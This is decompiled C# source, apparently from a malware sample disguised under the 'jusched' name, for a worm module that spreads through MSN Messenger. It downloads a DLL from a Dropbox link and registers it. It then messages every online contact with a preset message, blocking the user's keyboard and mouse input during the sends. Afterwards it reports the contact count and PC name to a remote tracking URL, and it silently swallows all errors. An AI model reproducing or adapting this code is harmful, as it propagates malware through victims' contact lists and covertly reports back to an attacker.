using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using MSNMessengerAPI;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using jusched.My;

namespace jusched;

internal class Msnspread
{
	public static string MYmessage;

	private const bool LOCKED = true;

	private const bool UNLOCKED = false;

	[DebuggerNonUserCode]
	public Msnspread()
	{
	}

	[DllImport("User32.dll")]
	private static extern bool BlockInput(bool fBlockIt);

	public static void MsnStart()
	{
		string text = Environment.CurrentDirectory + "\\MSNMessengerAPI.dll";
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (!process.ProcessName.Contains("msnmsgr"))
			{
				continue;
			}
			try
			{
				if (!File.Exists(text))
				{
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile("https://dl.dropbox.com/s/gkesrgljtp4ot49/MSNMessengerAPI.dll", text);
				}
				try
				{
					global_0.Registar_Dlls(text);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				MsnSend();
				Thread.Sleep(2000);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void MsnSend()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Invalid comparison between Unknown and I4
		try
		{
			MessengerClass val = new MessengerClass();
			if (((Enum)val.get_MyStatus()).Equals((object?)"MISTATUS_OFFLINE"))
			{
				return;
			}
			IMSNMessengerContacts val2 = (IMSNMessengerContacts)val.get_MyContacts();
			int num = 0;
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					IMSNMessengerContact val3 = (IMSNMessengerContact)enumerator.Current;
					if ((int)val3.get_Status() != 1)
					{
						try
						{
							val.InstantMessage((object)val3);
							SendKeys.SendWait(MYmessage);
							BlockInput(fBlockIt: true);
							Thread.Sleep(500);
							SendKeys.SendWait("{ENTER}");
							Thread.Sleep(1000);
							SendKeys.SendWait("{ESCAPE}");
							BlockInput(fBlockIt: false);
							Thread.Sleep(10000);
							num = checked(num + 1);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			if (num != 0)
			{
				global_0.webget(Configuration.info + "?xxx=" + Conversions.ToString(Conversions.ToDouble("Message sent to ") + (double)num + Conversions.ToDouble(" contacts From ")) + Configuration.pcname);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
